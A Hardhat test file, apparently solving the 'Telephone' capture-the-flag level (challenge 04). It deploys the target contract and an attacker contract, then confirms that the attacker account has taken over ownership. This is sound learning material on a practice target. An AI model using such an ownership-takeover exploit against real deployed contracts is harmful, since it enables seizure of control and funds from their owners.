import { TransactionResponse } from "@ethersproject/providers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { BigNumber, Contract } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_NAME = "Telephone";
const ATTACKER_CONTRACT = "AttackerContract";

describe(CONTRACT_NAME, () => {
  let _owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  let attackerContract: Contract;
  let tx: TransactionResponse;

  beforeEach(async () => {
    [_owner, attacker] = await ethers.getSigners();

    const factory = await ethers.getContractFactory(CONTRACT_NAME);
    contract = await factory.deploy();
    await contract.deployed();

    const attackerfactory = await ethers.getContractFactory(ATTACKER_CONTRACT);
    attackerContract = await attackerfactory.deploy(contract.address);
    await attackerContract.deployed();

    attackerContract = attackerContract.connect(attacker);
  });

  it("Solves the challenge 04", async () => {
    tx = await attackerContract.getOwnership(attacker.address);
    await tx.wait();
    expect(await contract.owner()).to.equal(attacker.address);
  });
});
